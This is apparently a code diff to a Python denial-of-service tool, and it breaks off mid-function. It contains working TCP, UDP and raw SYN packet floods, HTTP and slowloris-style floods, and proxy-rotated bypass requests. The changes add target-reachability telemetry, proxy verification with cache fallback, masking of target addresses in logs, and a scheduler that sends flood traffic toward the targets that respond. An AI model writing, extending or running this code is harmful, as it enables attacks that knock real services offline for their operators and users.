@@ -12,23 +12,70 @@ import re
 import socket
 import ssl
 import sys
+import errno
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
+from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Dict, List, Optional, Set, Tuple
 
-from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
+from PyRoxy import Proxy, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from impacket.ImpactPacket import IP, TCP
 from requests import Session, get
 from yarl import URL
 
+
+# ----------------------------------------------------------------------
+# Display-only target redaction for logs
+# ----------------------------------------------------------------------
+_IPV4_LOG = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
+
+
+def mask_ipv4(ip: str) -> str:
+    parts = ip.split(".")
+    if len(parts) != 4:
+        return "[masked]"
+    return f"{parts[0]}.**.{parts[2]}.**"
+
+
+def mask_host_or_ip(host: str) -> str:
+    trimmed = host.strip()
+    if not trimmed:
+        return "[masked]"
+    if _IPV4_LOG.match(trimmed):
+        return mask_ipv4(trimmed)
+    visible = min(2, max(1, len(trimmed) // 4))
+    return f"{trimmed[:visible]}***"
+
+
+def mask_target_label(label: str) -> str:
+    if not label:
+        return "[masked]"
+    parts = label.split(None, 1)
+    if len(parts) == 1:
+        return mask_host_or_ip(parts[0])
+    method, endpoint = parts[0].upper(), parts[1]
+    if ":" in endpoint:
+        host, port = endpoint.rsplit(":", 1)
+        return f"{method} {mask_host_or_ip(host)}:{port}"
+    return f"{method} {mask_host_or_ip(endpoint)}"
+
+
+def mask_target_key(key: str) -> str:
+    if ":" in key:
+        host, port = key.rsplit(":", 1)
+        return f"{mask_host_or_ip(host)}:{port}"
+    return mask_host_or_ip(key)
+
+
+
 # ----------------------------------------------------------------------
 # Logging
 # ----------------------------------------------------------------------
-logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt="%H:%M:%S")
+logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt="%H:%M:%S", stream=sys.stdout)
 logger = logging.getLogger("BaseTool")
 logger.setLevel(logging.INFO)
 
@@ -73,12 +120,118 @@ class Tools:
         return size
 
 # ----------------------------------------------------------------------
+# Per-target health (connect attempt / success telemetry)
+# ----------------------------------------------------------------------
+ERROR_KIND_DNS = "dns"
+ERROR_KIND_REFUSED = "refused_closed_port"
+ERROR_KIND_TIMEOUT = "timeout_or_filtered"
+ERROR_KIND_ROUTE = "route_unavailable"
+ERROR_KIND_PROXY = "proxy_tunnel_failed"
+ERROR_KIND_TLS_HTTP = "tls_or_http_error"
+ERROR_KIND_UNKNOWN = "unknown"
+
+HARD_COOLDOWN_KINDS = {
+    ERROR_KIND_DNS,
+    ERROR_KIND_REFUSED,
+    ERROR_KIND_PROXY,
+}
+
+
+def classify_target_failure(exc: BaseException) -> Tuple[str, str]:
+    name = type(exc).__name__
+    if isinstance(exc, socket.gaierror):
+        return ERROR_KIND_DNS, f"{name}: DNS resolution failed"
+    if isinstance(exc, ConnectionRefusedError):
+        return ERROR_KIND_REFUSED, f"{name}: host reachable but port refused"
+    if isinstance(exc, socket.timeout):
+        return ERROR_KIND_TIMEOUT, (
+            f"{name}: TCP connect/send timed out; check VPN/proxy/firewall/routing"
+        )
+    if isinstance(exc, TimeoutError):
+        return ERROR_KIND_TIMEOUT, (
+            f"{name}: TCP connect/send timed out; check VPN/proxy/firewall/routing"
+        )
+    if isinstance(exc, OSError) and getattr(exc, "errno", None) in {errno.EHOSTUNREACH, errno.ENETUNREACH}:
+        return ERROR_KIND_ROUTE, f"{name}: network route unavailable; check VPN/proxy/firewall"
+    if name in ("ProxyConnectionError", "GeneralProxyError", "ProxyError"):
+        return ERROR_KIND_PROXY, (
+            f"{name}: proxy tunnel failed; refresh proxy list, try VPN, "
+            "or wait for proxy cache to reload"
+        )
+    if isinstance(exc, ssl.SSLError):
+        return ERROR_KIND_TLS_HTTP, f"{name}: TLS handshake failed"
+    lowered = name.lower()
+    if "ssl" in lowered or "certificate" in lowered:
+        return ERROR_KIND_TLS_HTTP, f"{name}: TLS/HTTPS error"
+    return ERROR_KIND_UNKNOWN, name
+
+
+def format_target_failure(exc: BaseException) -> str:
+    return classify_target_failure(exc)[1]
+
+
+class TargetHealth:
+    def __init__(self):
+        self._lock = threading.Lock()
+        self._entries: Dict[str, Dict[str, object]] = {}
+        self._recovered_reported: Set[str] = set()
+
+    def _blank_entry(self) -> Dict[str, object]:
+        return {
+            "attempts": 0,
+            "successes": 0,
+            "last_error": "",
+            "last_error_kind": ERROR_KIND_UNKNOWN,
+            "consecutive_failures": 0,
+        }
+
+    def _ensure_unlocked(self, key: str) -> None:
+        if key not in self._entries:
+            self._entries[key] = self._blank_entry()
+
+    def ensure(self, key: str) -> None:
+        with self._lock:
+            self._ensure_unlocked(key)
+
+    def record_attempt(self, key: str) -> None:
+        with self._lock:
+            self._ensure_unlocked(key)
+            self._entries[key]["attempts"] = int(self._entries[key]["attempts"]) + 1
+
+    def record_success(self, key: str) -> bool:
+        with self._lock:
+            self._ensure_unlocked(key)
+            self._entries[key]["successes"] = int(self._entries[key]["successes"]) + 1
+            self._entries[key]["consecutive_failures"] = 0
+            self._entries[key]["last_error"] = ""
+            self._entries[key]["last_error_kind"] = ERROR_KIND_UNKNOWN
+            if int(self._entries[key]["successes"]) == 1 and key not in self._recovered_reported:
+                self._recovered_reported.add(key)
+                return True
+            return False
+
+    def record_failure(self, key: str, exc: BaseException) -> None:
+        kind, message = classify_target_failure(exc)
+        with self._lock:
+            self._ensure_unlocked(key)
+            self._entries[key]["last_error"] = message
+            self._entries[key]["last_error_kind"] = kind
+            self._entries[key]["consecutive_failures"] = (
+                int(self._entries[key]["consecutive_failures"]) + 1
+            )
+
+    def snapshot(self) -> Dict[str, Dict[str, object]]:
+        with self._lock:
+            return {key: dict(val) for key, val in self._entries.items()}
+
+# ----------------------------------------------------------------------
 # Layer4 атаки
 # ----------------------------------------------------------------------
 class Layer4(threading.Thread):
     def __init__(self, target: Tuple[str, int], method: str = "TCP",
                  synevent: threading.Event = None,
-                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None):
+                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None,
+                 target_health: TargetHealth = None, burst_limit: Optional[int] = None):
         super().__init__(daemon=True)
         self._target = target
         self._method = method
@@ -86,6 +239,8 @@ class Layer4(threading.Thread):
         self.target_key = target_key
         self.stats_dict = stats_dict
         self.stats_lock = stats_lock
+        self.target_health = target_health
+        self._burst_limit = burst_limit
         self.methods = {"UDP": self.UDP, "SYN": self.SYN, "TCP": self.TCP}
 
     def run(self):
@@ -101,37 +256,71 @@ class Layer4(threading.Thread):
                     self.stats_dict[self.target_key] = [0, 0]
                 self.stats_dict[self.target_key][0] += 1
                 self.stats_dict[self.target_key][1] += bytes_sent
+        if self.target_health and self.target_key and self.target_health.record_success(self.target_key):
+            logger.info("target %s recovered: traffic flowing", mask_target_key(self.target_key))
+
+    def _record_attempt(self) -> None:
+        if self.target_health and self.target_key:
+            self.target_health.record_attempt(self.target_key)
+
+    def _record_failure(self, exc: BaseException) -> None:
+        if self.target_health and self.target_key:
+            self.target_health.record_failure(self.target_key, exc)
 
     def TCP(self):
-        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(.9)
-            s.connect(self._target)
-            while True:
-                data = random.randbytes(1024)
-                if s.send(data):
-                    self._update_stats(len(data))
-                else:
-                    break
+        self._record_attempt()
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.settimeout(.9)
+                s.connect(self._target)
+                sends = 0
+                while True:
+                    data = random.randbytes(1024)
+                    if s.send(data):
+                        self._update_stats(len(data))
+                        sends += 1
+                        if self._burst_limit is not None and sends >= self._burst_limit:
+                            break
+                    else:
+                        break
+        except Exception as exc:
+            self._record_failure(exc)
 
     def UDP(self):
-        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            while True:
-                data = random.randbytes(1024)
-                if s.sendto(data, self._target):
-                    self._update_stats(len(data))
-                else:
-                    break
+        self._record_attempt()
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                sends = 0
+                while True:
+                    data = random.randbytes(1024)
+                    if s.sendto(data, self._target):
+                        self._update_stats(len(data))
+                        sends += 1
+                        if self._burst_limit is not None and sends >= self._burst_limit:
+                            break
+                    else:
+                        break
+        except Exception as exc:
+            self._record_failure(exc)
 
     def SYN(self):
-        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
-            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            while True:
-                pkt = self._genrate_syn()
-                if s.sendto(pkt, self._target):
-                    self._update_stats(len(pkt))
-                else:
-                    break
+        self._record_attempt()
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                sends = 0
+                while True:
+                    pkt = self._genrate_syn()
+                    if s.sendto(pkt, self._target):
+                        self._update_stats(len(pkt))
+                        sends += 1
+                        if self._burst_limit is not None and sends >= self._burst_limit:
+                            break
+                    else:
+                        break
+        except Exception as exc:
+            self._record_failure(exc)
 
     def _genrate_syn(self):
         ip = IP()
@@ -162,7 +351,8 @@ class HttpFlood(threading.Thread):
                  rpc: int = 1, synevent: threading.Event = None,
                  useragents: Set[str] = None, referers: Set[str] = None,
                  proxies: Set[Proxy] = None,
-                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None):
+                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None,
+                 target_health: TargetHealth = None):
         super().__init__(daemon=True)
         self._thread_id = thread_id
         self._synevent = synevent
@@ -174,6 +364,7 @@ class HttpFlood(threading.Thread):
         self.target_key = target_key
         self.stats_dict = stats_dict
         self.stats_lock = stats_lock
+        self.target_health = target_health
         self.methods = {
             "POST": self.POST,
             "STRESS": self.STRESS,
@@ -220,6 +411,31 @@ class HttpFlood(threading.Thread):
                     self.stats_dict[self.target_key] = [0, 0]
                 self.stats_dict[self.target_key][0] += 1
                 self.stats_dict[self.target_key][1] += bytes_sent
+        if self.target_health and self.target_key and self.target_health.record_success(self.target_key):
+            logger.info("target %s recovered: traffic flowing", mask_target_key(self.target_key))
+
+    def _record_attempt(self) -> None:
+        if self.target_health and self.target_key:
+            self.target_health.record_attempt(self.target_key)
+
+    def _record_failure(self, exc: BaseException) -> None:
+        if self.target_health and self.target_key:
+            self.target_health.record_failure(self.target_key, exc)
+
+    def _run_http_flood(self, payload: bytes) -> None:
+        self._record_attempt()
+        sock = None
+        try:
+            sock = self.open_connection()
+            for _ in range(self._rpc):
+                if sock.send(payload):
+                    self._update_stats(len(payload))
+        except Exception as exc:
+            self._record_failure(exc)
+        finally:
+            if sock is not None:
+                with suppress(Exception):
+                    sock.close()
 
     def select(self, name: str):
         self.SENT_FLOOD = self.GET
@@ -279,11 +495,7 @@ class HttpFlood(threading.Thread):
 
     # ---------- Методи атак ----------
     def GET(self):
-        payload = self.generate_payload()
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                if s.send(payload):
-                    self._update_stats(len(payload))
+        self._run_http_flood(self.generate_payload())
 
     def POST(self):
         payload = self.generate_payload(
@@ -291,10 +503,7 @@ class HttpFlood(threading.Thread):
             f"Content-Type: application/json\r\n\r\n"
             f'{{"data": "{ProxyTools.Random.rand_str(32)}"}}'
         )[:-2]
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                if s.send(payload):
-                    self._update_stats(len(payload))
+        self._run_http_flood(payload)
 
     def STRESS(self):
         payload = self.generate_payload(
@@ -302,41 +511,60 @@ class HttpFlood(threading.Thread):
             f"Content-Type: application/json\r\n\r\n"
             f'{{"data": "{ProxyTools.Random.rand_str(512)}"}}'
         )[:-2]
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                if s.send(payload):
-                    self._update_stats(len(payload))
+        self._run_http_flood(payload)
 
     def BYPASS(self):
         pro = random.choice(self._proxies).asRequest() if self._proxies else None
-        with suppress(Exception), Session() as s:
-            for _ in range(self._rpc):
-                resp = s.get(self._target.human_repr(), proxies=pro) if pro else s.get(self._target.human_repr())
-                self._update_stats(Tools.sizeOfRequest(resp))
+        self._record_attempt()
+        try:
+            with Session() as s:
+                for _ in range(self._rpc):
+                    resp = s.get(self._target.human_repr(), proxies=pro) if pro else s.get(self._target.human_repr())
+                    self._update_stats(Tools.sizeOfRequest(resp))
+        except Exception as exc:
+            self._record_failure(exc)
 
     def GSB(self):
-        with suppress(Exception), self.open_connection() as s:
+        self._record_attempt()
+        sock = None
+        try:
+            sock = self.open_connection()
             for _ in range(self._rpc):
                 qs = f"{self._target.raw_path_qs}?qs={ProxyTools.Random.rand_str(6)}"
                 payload = str.encode(f"{self._req_type} {qs} HTTP/1.1\r\n"
                                      f"Host: {self._target.authority}\r\n" +
                                      self.randHeadercontent + "\r\n")
-                if s.send(payload):
+                if sock.send(payload):
                     self._update_stats(len(payload))
+        except Exception as exc:
+            self._record_failure(exc)
+        finally:
+            if sock is not None:
+                with suppress(Exception):
+                    sock.close()
 
     def SLOW(self):
+        self._record_attempt()
         payload = self.generate_payload()
-        with suppress(Exception), self.open_connection() as s:
+        sock = None
+        try:
+            sock = self.open_connection()
             for _ in range(self._rpc):
-                if s.send(payload):
+                if sock.send(payload):
                     self._update_stats(len(payload))
-            while s.send(payload) and s.recv(1):
+            while sock.send(payload) and sock.recv(1):
                 for _ in range(self._rpc):
                     keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
-                    if s.send(keep):
+                    if sock.send(keep):
                         self._update_stats(len(keep))
                     time.sleep(self._rpc / 15)
                     break
+        except Exception as exc:
+            self._record_failure(exc)
+        finally:
+            if sock is not None:
+                with suppress(Exception):
+                    sock.close()
 
 # ----------------------------------------------------------------------
 # Проксі-менеджер
@@ -346,28 +574,64 @@ class ProxyManager:
     CACHE_DIR = BASE_DIR / "cache"
     CACHE_FILE = CACHE_DIR / "proxies.json"
     CACHE_MAX_AGE = 86400  # 24 години
+    VERIFY_MAX_CANDIDATES = 2500
+    VERIFY_MIN_WORKING = 64
+    VERIFY_PER_PROXY_TIMEOUT = 2.5
+    VERIFY_THREADS = 100
+    VERIFY_DEADLINE_SEC = 120.0
 
     @staticmethod
-    def _load_cache():
+    def _proxy_type_name(proxy: Proxy) -> str:
+        ptype = getattr(proxy, "type", None)
+        if ptype is None:
+            return "http"
+        name = getattr(ptype, "name", str(ptype))
+        return str(name).lower()
+
+    @staticmethod
+    def _parse_cached_proxy(entry) -> Optional[Proxy]:
+        if isinstance(entry, str):
+            line = entry.strip()
+            if not line:
+                return None
+            for ptype in (ProxyType.HTTP, ProxyType.SOCKS4, ProxyType.SOCKS5):
+                parsed = ProxyUtiles.parseAllIPPort([line], ptype)
+                if parsed:
+                    return next(iter(parsed))
+            return None
+        if isinstance(entry, dict):
+            host = entry.get("host")
+            port = entry.get("port")
+            if not host or port is None:
+                return None
+            ptype = ProxyType.stringToProxyType(str(entry.get("type", "http")))
+            parsed = ProxyUtiles.parseAllIPPort([f"{host}:{port}"], ptype)
+            if parsed:
+                return next(iter(parsed))
+        return None
+
+    @staticmethod
+    def _read_cache_entries(allow_stale: bool = False) -> Optional[List[Proxy]]:
         if not ProxyManager.CACHE_FILE.exists():
             return None
         try:
             data = load_json_safe(ProxyManager.CACHE_FILE)
             age = time.time() - data.get("timestamp", 0)
-            if age < ProxyManager.CACHE_MAX_AGE:
-                proxies = []
-                for line in data.get("proxies", []):
-                    # line очікується у форматі "IP:PORT"
-                    for ptype in (ProxyType.HTTP, ProxyType.SOCKS4, ProxyType.SOCKS5):
-                        parsed = ProxyUtiles.parseAllIPPort([line], ptype)
-                        if parsed:
-                            proxies.extend(parsed)
-                            break
-                if proxies:
-                    logger.info(f"Loaded {len(proxies)} proxies from cache")
-                    return proxies
-            else:
+            if age >= ProxyManager.CACHE_MAX_AGE and not allow_stale:
                 logger.info("Cache expired, reloading...")
+                return None
+            proxies: List[Proxy] = []
+            for entry in data.get("proxies", []):
+                parsed = ProxyManager._parse_cached_proxy(entry)
+                if parsed:
+                    proxies.append(parsed)
+            if not proxies:
+                return None
+            if age >= ProxyManager.CACHE_MAX_AGE:
+                logger.warning("Using expired proxy cache (%s proxies)", len(proxies))
+            else:
+                logger.info("Loaded %s proxies from cache", len(proxies))
+            return proxies
         except Exception as e:
             logger.warning(f"Cache read error: {e}")
         return None
@@ -375,9 +639,15 @@ class ProxyManager:
     @staticmethod
     def _save_cache(proxies: List[Proxy]):
         ProxyManager.CACHE_DIR.mkdir(parents=True, exist_ok=True)
-        # Зберігаємо у форматі "host:port", який розпізнає parseAllIPPort
-        lines = [f"{p.host}:{p.port}" for p in proxies]
-        data = {"timestamp": time.time(), "proxies": lines}
+        entries = [
+            {
+                "host": p.host,
+                "port": p.port,
+                "type": ProxyManager._proxy_type_name(p),
+            }
+            for p in proxies
+        ]
+        data = {"timestamp": time.time(), "proxies": entries, "version": 2}
         try:
             with open(ProxyManager.CACHE_FILE, 'w') as f:
                 json.dump(data, f)
@@ -386,16 +656,96 @@ class ProxyManager:
             logger.warning(f"Could not save proxy cache: {e}")
 
     @staticmethod
+    def _verify_proxies_bounded(
+        candidates: List[Proxy],
+        test_url: str,
+        *,
+        max_candidates: int = VERIFY_MAX_CANDIDATES,
+        min_working: int = VERIFY_MIN_WORKING,
+        per_proxy_timeout: float = VERIFY_PER_PROXY_TIMEOUT,
+        threads: int = VERIFY_THREADS,
+        deadline_sec: float = VERIFY_DEADLINE_SEC,
+    ) -> List[Proxy]:
+        if not candidates:
+            return []
+
+        pool = list(candidates)
+        random.shuffle(pool)
+        to_check = pool[:max_candidates]
+        total = len(pool)
+        if total > len(to_check):
+            logger.info(
+                "Checking up to %s of %s downloaded proxies (bounded verify, deadline %.0fs)...",
+                len(to_check),
+                total,
+                deadline_sec,
+            )
+        else:
+            logger.info(
+                "Verifying %s proxies (bounded verify, deadline %.0fs)...",
+                len(to_check),
+                deadline_sec,
+            )
+
+        working: List[Proxy] = []
+        deadline = time.monotonic() + deadline_sec
+        thread_count = max(1, min(threads, len(to_check)))
+        batch_size = max(thread_count, min(64, len(to_check)))
+        cursor = 0
+
+        with ThreadPoolExecutor(max_workers=thread_count) as executor:
+            while (
+                cursor < len(to_check)
+                and len(working) < min_working
+                and time.monotonic() < deadline
+            ):
+                batch = to_check[cursor:cursor + batch_size]
+                cursor += len(batch)
+                futures = {
+                    executor.submit(proxy.check, test_url, per_proxy_timeout): proxy
+                    for proxy in batch
+                }
+                for future in as_completed(futures):
+                    if time.monotonic() >= deadline:
+                        break
+                    proxy = futures[future]
+                    try:
+                        if future.result():
+                            working.append(proxy)
+                            if len(working) >= min_working:
+                                logger.info(
+                                    "Found %s working proxies (target %s); stopping early",
+                                    len(working),
+                                    min_working,
+                                )
+                                break
+                    except Exception:
+                        pass
+
+                for future in futures:
+                    if not future.done():
+                        future.cancel()
+
+            if time.monotonic() >= deadline and len(working) < min_working:
+                logger.warning(
+                    "Proxy verification deadline reached (%ss); using %s working proxies so far",
+                    int(deadline_sec),
+                    len(working),
+                )
+
+        return working
+
+    @staticmethod
     def get_proxies(proxy_providers: list, check_url: str = None) -> Optional[List[Proxy]]:
         if not proxy_providers:
             return None
 
-        cached = ProxyManager._load_cache()
+        cached = ProxyManager._read_cache_entries(allow_stale=False)
         if cached:
             return cached
 
         all_proxies = set()
-        with ThreadPoolExecutor(max_workers=len(proxy_providers)) as executor:
+        with ThreadPoolExecutor(max_workers=max(1, len(proxy_providers))) as executor:
             futures = {executor.submit(ProxyManager._download_one, p): p for p in proxy_providers}
             for future in as_completed(futures):
                 try:
@@ -403,15 +753,37 @@ class ProxyManager:
                 except Exception as e:
                     logger.error(f"Download error: {e}")
 
-        logger.info(f"Downloaded {len(all_proxies)} proxies, verifying...")
-        test_url = check_url or "http://httpbin.org/get"
-        working = ProxyChecker.checkAll(all_proxies, timeout=5, threads=100, url=test_url)
-        if not working:
-            logger.error("No working proxies found.")
+        if not all_proxies:
+            logger.error("No proxies downloaded from providers.")
+            stale = ProxyManager._read_cache_entries(allow_stale=True)
+            if stale:
+                logger.warning(
+                    "Using stale proxy cache (%s proxies) after empty provider download",
+                    len(stale),
+                )
+                return stale
             return None
-        logger.info(f"{len(working)} proxies ready.")
-        ProxyManager._save_cache(list(working))
-        return list(working)
+
+        test_url = check_url or "http://httpbin.org/get"
+        working = ProxyManager._verify_proxies_bounded(list(all_proxies), test_url)
+        if working:
+            logger.info("%s proxies ready.", len(working))
+            ProxyManager._save_cache(working)
+            return working
+
+        stale = ProxyManager._read_cache_entries(allow_stale=True)
+        if stale:
+            logger.warning(
+                "No working proxies from verification; using stale cache (%s proxies)",
+                len(stale),
+            )
+            return stale
+
+        logger.error(
+            "No working proxies found; proxy pool exhausted. "
+            "Provider lists may be dead or blocked on this network."
+        )
+        return None
 
     @staticmethod
     def _download_one(provider: dict) -> Set[Proxy]:
@@ -458,7 +830,8 @@ def monitor_loop(stop_event: threading.Event, target_stats: dict, stats_lock: th
         for i in range(data_lines):
             if i < len(sorted_targets):
                 tgt, (req, byt) = sorted_targets[i]
-                lines.append(f"{tgt:<30} {req:>10} {Tools.humanbytes(byt):>15}")
+                display_tgt = mask_target_key(tgt)
+                lines.append(f"{display_tgt:<30} {req:>10} {Tools.humanbytes(byt):>15}")
             else:
                 lines.append("")
 
@@ -476,6 +849,482 @@ def monitor_loop(stop_event: threading.Event, target_stats: dict, stats_lock: th
     sys.stdout.write("\033[u")
     sys.stdout.flush()
 
+def health_watchdog_loop(stop_event: threading.Event, target_health: TargetHealth,
+                         target_keys: List[str], proxy_mode: str = "direct"):
+    last_warn: Dict[str, float] = {}
+    last_aggregate_warn = 0.0
+    while stop_event.is_set():
+        snapshot = target_health.snapshot()
+        now = time.time()
+        total_attempts = 0
+        total_successes = 0
+        active_targets = 0
+        for key in target_keys:
+            entry = snapshot.get(key)
+            if not entry:
+                continue
+            attempts = int(entry.get("attempts", 0))
+            successes = int(entry.get("successes", 0))
+            last_error = str(entry.get("last_error", "") or "")
+            total_attempts += attempts
+            total_successes += successes
+            if attempts > 0:
+                active_targets += 1
+            if successes > 0:
+                continue
+            if attempts <= 0:
+                continue
+            if not last_error:
+                continue
+            interval = 5.0 if attempts < 20 else 30.0
+            prev = last_warn.get(key, 0.0)
+            if now - prev >= interval:
+                message = (
+                    f"target {mask_target_key(key)} unreachable: 0/{attempts} attempts "
+                    f"(last: {last_error})"
+                )
+                logger.warning(message)
+                print(message, file=sys.stderr, flush=True)
+                last_warn[key] = now
+
+        all_have_errors = active_targets > 0
+        for key in target_keys:
+            entry = snapshot.get(key)
+            if not entry:
+                continue
+            attempts = int(entry.get("attempts", 0))
+            if attempts <= 0:
+                continue
+            if not str(entry.get("last_error", "") or ""):
+                all_have_errors = False
+                break
+
+        aggregate_interval = 10.0 if total_attempts < 50 else 30.0
+        if (
+            active_targets > 0
+            and total_attempts > 0
+            and total_successes == 0
+            and all_have_errors
+            and now - last_aggregate_warn >= aggregate_interval
+        ):
+            if proxy_mode == "direct":
+                aggregate = (
+                    "all targets unreachable; direct mode is active; "
+                    "enable proxy or VPN, or check DNS/firewall"
+                )
+            else:
+                aggregate = (
+                    "all targets unreachable; proxy mode is active but no traffic is flowing; "
+                    "proxy pool may be dead — refresh module, check providers, or try VPN"
+                )
+            logger.warning(aggregate)
+            print(aggregate, file=sys.stderr, flush=True)
+            last_aggregate_warn = now
+        time.sleep(5)
+
+
+def capacity_health_loop(
+    stop_event: threading.Event,
+    target_health: TargetHealth,
+    target_keys: List[str],
+    target_stats: dict,
+    stats_lock: threading.Lock,
+    scheduler: "TargetScheduler",
+    worker_count: int,
+    proxy_mode: str,
+    interval_sec: float = 10.0,
+):
+    last_emit = 0.0
+    while stop_event.is_set():
+        now = time.time()
+        if now - last_emit < interval_sec:
+            time.sleep(1)
+            continue
+        last_emit = now
+
+        snapshot = target_health.snapshot()
+        with stats_lock:
+            stats_snapshot = {key: val.copy() for key, val in target_stats.items()}
+
+        pools = scheduler.summarize_pools(snapshot, now)
+        useful_bytes = sum(int(val[1]) for val in stats_snapshot.values())
+        wasted_attempts = 0
+        for key in target_keys:
+            entry = snapshot.get(key, {})
+            attempts = int(entry.get("attempts", 0))
+            successes = int(entry.get("successes", 0))
+            wasted_attempts += max(0, attempts - successes)
+
+        ready_count = scheduler.count_ready(snapshot, now)
+        idle_workers = max(0, worker_count - min(worker_count, ready_count))
+        diagnosis = scheduler.derive_diagnosis(
+            pools,
+            proxy_mode=proxy_mode,
+            useful_bytes=useful_bytes,
+            ready_count=ready_count,
+        )
+
+        payload = {
+            "healthyTargets": pools["healthy"],
+            "degradedTargets": pools["degraded"],
+            "discoveryTargets": pools["discovery"],
+            "closedTargets": pools["closed"],
+            "cooldownTargets": pools["cooldown"],
+            "activeWorkers": worker_count,
+            "readyTargets": ready_count,
+            "idleWorkers": idle_workers,
+            "wastedAttempts": wasted_attempts,
+            "usefulBytes": useful_bytes,
+            "diagnosis": diagnosis,
+            "proxyMode": proxy_mode,
+        }
+        line = f"BASETOOL_HEALTH {json.dumps(payload, separators=(',', ':'))}"
+        logger.info(line)
+        print(line, file=sys.stderr, flush=True)
+        time.sleep(1)
+
+
+# ----------------------------------------------------------------------
+# Adaptive health-aware target scheduler
+# Targets with past successes stay healthy only while consecutive failures
+# remain below HEALTHY_DEMOTION_STREAK; demoted targets use the normal
+# discovery/degraded/closed pools and may re-enter via recovery probes.
+# ----------------------------------------------------------------------
+MAX_WORKER_THREADS = 512
+LAYER4_BURST_SENDS = 8
+DISCOVERY_ATTEMPTS_PER_TARGET = 2
+
+
+@dataclass
+class TargetJob:
+    method: str
+    target_key: str
+    layer4_addr: Optional[Tuple[str, int]] = None
+    url: Optional[URL] = None
+    host: Optional[str] = None
+    rpc: int = 1
+    proxies: Optional[Set[Proxy]] = None
+    useragents: Set[str] = field(default_factory=set)
+    referers: Set[str] = field(default_factory=set)
+
+
+class TargetScheduler:
+    BACKOFF_BASE_SEC = 2.0
+    BACKOFF_MAX_SEC = 45.0
+    BACKOFF_AFTER_ATTEMPTS = 3
+    HARD_BACKOFF_BASE_SEC = 30.0
+    HARD_BACKOFF_MAX_SEC = 120.0
+    HARD_BACKOFF_AFTER_ATTEMPTS = 2
+    HEALTHY_DEMOTION_STREAK = 2
+    POOL_HEALTHY = 0
+    POOL_DISCOVERY = 1
+    POOL_DEGRADED = 2
+    POOL_COOLDOWN_PROBE = 3
+
+    def __init__(self, jobs: List[TargetJob], target_health: TargetHealth, worker_count: int = 1):
+        self.jobs = jobs
+        self.target_health = target_health
+        self.worker_count = max(1, worker_count)
+        self._lock = threading.Lock()
+        self._backoff_until: Dict[str, float] = {}
+        self._cursor = 0
+        self._probe_cursor = 0
+        self._pick_counter = 0
+
+    def _pick_round_robin(self, group: List[TargetJob], probe: bool = False) -> TargetJob:
+        if probe:
+            job = group[self._probe_cursor % len(group)]
+            self._probe_cursor += 1
+            return job
+        job = group[self._cursor % len(group)]
+        self._cursor += 1
+        return job
+
+    def _failure_streak(self, key: str, snapshot: Dict[str, Dict[str, object]]) -> int:
+        entry = snapshot.get(key, {})
+        return int(entry.get("consecutive_failures", 0)) or max(
+            0,
+            int(entry.get("attempts", 0)) - int(entry.get("successes", 0)),
+        )
+
+    def _consecutive_failure_streak(
+        self, key: str, snapshot: Dict[str, Dict[str, object]]
+    ) -> int:
+        entry = snapshot.get(key, {})
+        return int(entry.get("consecutive_failures", 0))
+
+    def _is_currently_healthy(
+        self,
+        key: str,
+        entry: Dict[str, object],
+        snapshot: Dict[str, Dict[str, object]],
+    ) -> bool:
+        if int(entry.get("successes", 0)) <= 0:
+            return False
+        streak = self._consecutive_failure_streak(key, snapshot)
+        if streak < self.HEALTHY_DEMOTION_STREAK:
+            return True
+        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
+        return kind not in HARD_COOLDOWN_KINDS
+
+    def _pool_for_entry(
+        self,
+        key: str,
+        entry: Dict[str, object],
+        now: float,
+        in_backoff: bool,
+    ) -> int:
+        successes = int(entry.get("successes", 0))
+        attempts = int(entry.get("attempts", 0))
+        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
+
+        if successes > 0 and self._is_currently_healthy(
+            key, entry, {key: entry}
+        ):
+            return self.POOL_HEALTHY
+        if attempts < DISCOVERY_ATTEMPTS_PER_TARGET:
+            return self.POOL_DISCOVERY
+        if in_backoff:
+            if kind in HARD_COOLDOWN_KINDS:
+                return self.POOL_COOLDOWN_PROBE
+            return self.POOL_COOLDOWN_PROBE
+        if kind in HARD_COOLDOWN_KINDS:
+            return self.POOL_COOLDOWN_PROBE
+        if kind in (ERROR_KIND_TIMEOUT, ERROR_KIND_ROUTE, ERROR_KIND_TLS_HTTP, ERROR_KIND_UNKNOWN):
+            return self.POOL_DEGRADED
+        return self.POOL_DEGRADED
+
+    def summarize_pools(self, snapshot: Dict[str, Dict[str, object]], now: float) -> Dict[str, int]:
+        counts = {"healthy": 0, "discovery": 0, "degraded": 0, "closed": 0, "cooldown": 0}
+        for job in self.jobs:
+            key = job.target_key
+            entry = snapshot.get(key, {})
+            in_backoff = self._backoff_until.get(key, 0) > now
+            pool = self._pool_for_entry(key, entry, now, in_backoff)
